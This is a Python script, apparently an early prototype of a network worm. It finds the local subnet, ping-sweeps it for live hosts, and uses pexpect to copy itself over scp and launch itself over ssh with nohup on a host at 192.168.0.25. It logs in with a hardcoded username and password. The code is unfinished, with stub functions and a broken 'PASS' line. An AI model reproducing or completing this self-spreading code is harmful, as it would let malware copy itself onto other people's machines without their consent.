#!/usr/bin/env python

"""
  Author: laureote-loic@hotmail.fr

"""
import os
import socket
import fcntl
import struct
import json
import sys, re
import sys
import re
import json
import struct
import socket
import fcntl
import sys
import subprocess
import pexpect

def ip2bin(ip):
    b = ""
    inQuads = ip.split(".")
    outQuads = 4
    for q in inQuads:
        if q != "":
            b += dec2bin(int(q),8)
            outQuads -= 1
    while outQuads > 0:
        b += "00000000"
        outQuads -= 1
    return b

# convert a decimal number to binary representation
# if d is specified, left-pad the binary number with 0s to that length
def dec2bin(n,d=None):
    s = ""
    while n>0:
        if n&1:
            s = "1"+s
        else:
            s = "0"+s
        n >>= 1
    if d is not None:
        while len(s)<d:
            s = "0"+s
    if s == "": s = "0"
    return s

# convert a binary string into an IP address
def bin2ip(b):
    ip = ""
    for i in range(0,len(b),8):
        ip += str(int(b[i:i+8],2))+"."
    return ip[:-1]

# print a list of IP addresses based on the CIDR block specified
def printCIDR(c):
    ipslist=[]
    parts = c.split("/")
    baseIP = ip2bin(parts[0])
    subnet = int(parts[1])
    # Python string-slicing weirdness:
    # "myString"[:-1] -> "myStrin" but "myString"[:0] -> ""
    # if a subnet of 32 was specified simply print the single IP
    if subnet == 32:
        print bin2ip(baseIP)
    # for any other size subnet, print a list of IP addresses by concatenating
    # the prefix with each of the suffixes in the subnet
    else:
        ipPrefix = baseIP[:-(32-subnet)]
        for i in range(2**(32-subnet)):
            ipslist.append(bin2ip(ipPrefix+dec2bin(i, (32-subnet))))
    return ipslist



def get_current_pid():
   current_pid =os.getpid()
   return current_pid 


#convert netmask to cdr
def getCDR(netmask):
   calcdr = sum([bin(int(x)).count('1') for x in netmask.split('.')])
   return calcdr	


def getIPrange():
    PASS

#get netmask
def get_netmask_address(iface):
    mask = socket.inet_ntoa(fcntl.ioctl(socket.socket(socket.AF_INET, socket.SOCK_DGRAM), 35099, struct.pack('256s', iface))[20:24])
    return mask

#ping_the_network
def scan(ipslist):
    reachableiplist=[]
    for ip in ipslist:	
            res = subprocess.call(['ping', '-c', '3', ip])	
            if res == 0: 
                reachableiplist.append(ip)
    return  reachableiplist

def connect():
    pass

def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15])
    )[20:24])



def insertion(user, host, password):
    scp_cmd= 'scp ./worm.py %s@%s:/tmp/' % (user, host)
    print scp_cmd
    child = pexpect.spawn(scp_cmd, timeout=2)
    child.expect(['password:'])
    child.sendline(password)
                                                                                                                                                       
    child.expect(pexpect.EOF) 




def start(user,host, password):
    ssh_cmd= 'ssh %s@%s "nohup python /tmp/worm.py &' % (user, host)
    print ssh_cmd
    child = pexpect.spawn(ssh_cmd, timeout=2)
    child.expect(['password:'])
    child.sendline(password)
    child.expect(pexpect.EOF)

def main():
    val = get_ip_address('wlan0')
    if not val:
        val = get_ip_address('eth0')
    return val 


if '__main__' == __name__:
   #addr = str(get_ip_address('wlan0'))+'/'+ str(getCDR(get_netmask_address('wlan0')))
   #subnet = printCIDR(addr)
   #reachip = scan(subnet)
   #print reachip 
   insertion('master', '192.168.0.25','kodjemana')   
   start('master', '192.168.0.25','kodjemana')






